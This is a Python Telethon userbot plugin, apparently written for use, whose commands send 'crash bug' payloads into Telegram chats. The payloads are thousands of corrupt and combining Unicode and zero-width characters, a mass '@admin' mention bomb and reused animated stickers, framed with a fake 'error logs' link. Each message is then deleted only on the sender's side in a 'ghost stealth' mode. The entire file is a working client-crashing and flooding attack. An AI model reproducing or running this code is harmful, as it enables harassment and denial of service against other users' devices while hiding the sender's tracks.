import asyncio
import os
from telethon import events, functions, types

# --- ULTRA DEADLY PAYLOADS ---
# Isme Invisible characters aur corrupt unicode ka combo hai
KILL_PAYLOAD = "జ్ఞా" * 1000 + " 𑪶" * 1000 + " \u0e47" * 2000 + " \u17b5" * 1500 + "‌" * 5000
MENTION_BOMB = "@admin " * 3000

async def setup(client):
    # Helper Function: Message bhej ke turant apne liye delete karna
    async def send_and_ghost(event, text, sticker=None):
        chat = event.chat_id
        try:
            if sticker:
                msg = await event.client.send_file(chat, sticker)
            else:
                msg = await event.client.send_message(chat, text)
            
            # 👻 GHOST LOGIC: Apne liye delete karo turant
            await event.client(functions.messages.DeleteMessagesRequest(
                id=[msg.id],
                revoke=False # False matlab sirf mere liye delete hoga
            ))
            await event.client.send_message("me", f"🚀 **Bug Sent Successfully in chat:** `{chat}`\n`Mode: Ghost Stealth`")
        except Exception as e:
            await event.client.send_message("me", f"❌ **Bug Failed:** {e}")

    # 1. TEXT BUG (.crashtxt)
    @client.on(events.NewMessage(pattern=r"\.crashtxt$", outgoing=True))
    async def txt_bug(event):
        await event.edit("📩 `Sending Text Bug...`")
        payload = f"**⚠️ SYSTEM OVERLOAD ⚠️**\n[CLICK TO VIEW ERROR LOGS](https://t.me/crash)\n{KILL_PAYLOAD}"
        await send_and_ghost(event, payload)
        await event.delete()

    # 2. MENTION BUG (.crashment)
    @client.on(events.NewMessage(pattern=r"\.crashment$", outgoing=True))
    async def ment_bug(event):
        await event.edit("📩 `Sending Mention Bomb...`")
        payload = f"🔥 **TAGGED:** {MENTION_BOMB}"
        await send_and_ghost(event, payload)
        await event.delete()

    # 3. STICKER BUG (.crashstick)
    @client.on(events.NewMessage(pattern=r"\.crashstick$", outgoing=True))
    async def stick_bug(event):
        reply = await event.get_reply_message()
        if not reply or not reply.sticker:
            return await event.edit("`Reply to an animated sticker!`")
        await event.edit("📩 `Sending Corrupt Sticker...`")
        # 1-2 sticker hi kafi hain agar unhe ghost mode mein bheja jaye
        await send_and_ghost(event, "", sticker=reply.sticker)
        await event.delete()

    # 4. NUCLEAR STRIKE (.crashkill)
    @client.on(events.NewMessage(pattern=r"\.crashkill$", outgoing=True))
    async def kill_bug(event):
        reply = await event.get_reply_message()
        await event.edit("☢️ **NUCLEAR STRIKE INITIALIZED...**")
        
        # Combo Payload
        await send_and_ghost(event, f"🚀 **STRIKE 1 (TEXT):**\n{KILL_PAYLOAD}")
        await send_and_ghost(event, f"🔥 **STRIKE 2 (MENTION):**\n{MENTION_BOMB}")
        
        if reply and reply.sticker:
            await send_and_ghost(event, "", sticker=reply.sticker)
        
        await event.edit("✅ **Target Eliminated. Chat cleaned for sender.**")
        await asyncio.sleep(2)
        await event.delete()

